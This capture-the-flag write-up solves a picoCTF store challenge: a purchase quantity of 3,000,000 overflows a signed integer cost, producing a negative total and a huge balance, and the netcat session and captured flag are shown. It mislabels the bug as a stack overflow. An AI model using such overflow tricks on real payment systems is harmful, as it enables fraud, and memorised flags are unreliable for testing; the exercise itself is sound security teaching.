# 42 Solution
`store.c` contains the implementation of the server that we are interacting with via the netcat command presented in the query. The flag costs 100000 to purchase, but the starting funds of the account is 1100, with no apparent way to obtain more funds following the options given by the program.

Closer inspection of the `auction_choice == 1` clause reveals a stack overflow error in the program.

```
total_cost = 900*number_flags;
printf("\nThe final cost is: %d\n", total_cost);
if(total_cost <= account_balance){
    account_balance = account_balance - total_cost;
    printf("\nYour current balance after transaction: %d\n\n", account_balance);
}
```

By specifying a sufficient number of flags to purchase (saved as `number_flags`), we can cause an overflow in the saved representation of `total_cost` which is a signed int, such that the total cost is negative as opposed to a positive number smaller than `account_balance`.

Here is a stack trace of the interaction with the program to exploit this:

```
$ nc jupiter.challenges.picoctf.org 44566
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000

The final cost is: -1594967296

Your current balance after transaction: 1594968396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
```